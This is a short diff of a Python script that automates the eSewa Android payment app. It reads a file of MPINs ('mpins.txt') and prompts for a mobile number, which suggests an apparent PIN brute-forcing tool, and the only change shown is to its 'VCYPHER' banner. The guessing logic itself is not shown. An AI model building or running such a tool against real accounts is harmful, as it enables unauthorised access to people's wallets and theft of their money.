@@ -15,7 +15,7 @@ d(resourceId="com.esewa.android:id/toolbar_login/register").click()
 
 # Wait for some time to allow for manual interaction
 input("Perform manual actions and press Enter when ready...")
-print('\n--v1.1.3------**vcypher$/coded by: vicky------\n')
+print('\n--v1.1.3------**VCYPHER**/coded by:vicky**------\n')
 file=open('mpins.txt','r')
 
 email=str(raw_input('Enter Mobile Number : ').strip())
